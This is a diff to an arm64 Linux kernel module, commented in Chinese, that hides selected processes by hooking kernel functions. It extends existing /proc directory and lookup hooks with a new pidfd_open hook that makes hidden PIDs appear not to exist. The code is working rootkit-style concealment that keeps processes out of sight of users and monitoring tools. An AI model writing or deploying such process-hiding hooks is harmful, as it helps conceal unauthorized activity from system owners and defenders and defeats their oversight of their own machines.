@@ -32,6 +32,7 @@
 #include <linux/err.h>
 #include <linux/version.h>
 #include <linux/mutex.h>
+#include <uapi/linux/pidfd.h>
 
 #include "export_fun.h"
 #include "inline_hook_frame.h"
@@ -63,6 +64,7 @@ static bool hide_task_match_pid_name(const char *name, int namlen, unsigned int 
     return false;
 }
 
+// 设置成功返回值并跳过 filldir64，省略当前目录项。
 static int filldir64_skip_entry(struct pt_regs *regs)
 {
     // 命中后伪造“当前目录项已成功处理”，并跳过原 filldir64，不写入用户缓冲。
@@ -85,6 +87,7 @@ static int filldir64_hook_work(struct pt_regs *regs)
     return hide_task_match_pid_name(name, namlen, d_type) ? filldir64_skip_entry(regs) : 0;
 }
 
+// 拦截隐藏 PID 的直接查找，返回 ENOENT。
 static int proc_pid_lookup_hook_work(struct pt_regs *regs)
 {
     const struct dentry *dentry = (const struct dentry *)regs->regs[0];
@@ -95,6 +98,7 @@ static int proc_pid_lookup_hook_work(struct pt_regs *regs)
     return 1;
 }
 
+// 使 /proc 根目录下已缓存的隐藏 PID 目录项失效。
 static int pid_revalidate_hook_work(struct pt_regs *regs)
 {
     bool legacy_signature = __builtin_types_compatible_p(typeof(((struct dentry_operations *)0)->d_revalidate), int (*)(struct dentry *, unsigned int));
@@ -106,10 +110,35 @@ static int pid_revalidate_hook_work(struct pt_regs *regs)
     return 1;
 }
 
+// pidfd_open 的 x0 指向系统调用现场；隐藏表中的 TGID 按不存在处理。
+static int pidfd_open_hook_work(struct pt_regs *regs)
+{
+    const struct pt_regs *sys_regs = (const struct pt_regs *)(uintptr_t)regs->regs[0];
+    if (!sys_regs) return 0;
+
+    unsigned int allowed_flags = PIDFD_NONBLOCK;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
+    allowed_flags |= PIDFD_THREAD;
+#endif
+    if ((unsigned int)sys_regs->regs[1] & ~allowed_flags) return 0;
+
+    pid_t pid = (pid_t)sys_regs->regs[0];
+    if (pid <= 0) return 0;
+
+    for (int i = 0; i < HIDE_TASK_MAX_PIDS; i++)
+    {
+        if (READ_ONCE(g_hidden_pids[i]) != pid) continue;
+        regs->regs[0] = (unsigned long)-ESRCH;
+        return 1;
+    }
+    return 0;
+}
+
 static struct hook_entry g_hide_task_hooks[] = {
     HOOK_ENTRY("filldir64", filldir64_hook_work),
     HOOK_ENTRY("proc_pid_lookup", proc_pid_lookup_hook_work),
     HOOK_ENTRY("pid_revalidate", pid_revalidate_hook_work),
+    HOOK_ENTRY("__arm64_sys_pidfd_open", pidfd_open_hook_work),
 };
 
 // 安装 hook，隐藏目标 pid。
